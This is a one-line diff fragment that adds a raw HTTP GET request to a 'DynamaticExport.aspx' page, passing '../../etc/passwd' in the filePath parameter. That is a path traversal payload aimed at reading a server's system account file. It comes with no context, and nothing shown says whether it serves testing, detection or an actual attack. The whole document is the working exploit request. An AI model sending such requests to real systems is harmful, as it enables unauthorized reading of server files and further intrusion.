@@ -1,0 +1,1 @@
+GET Portal/Print/DynamaticExport.aspx?filePath=../../etc/passwd HTTP/1.1
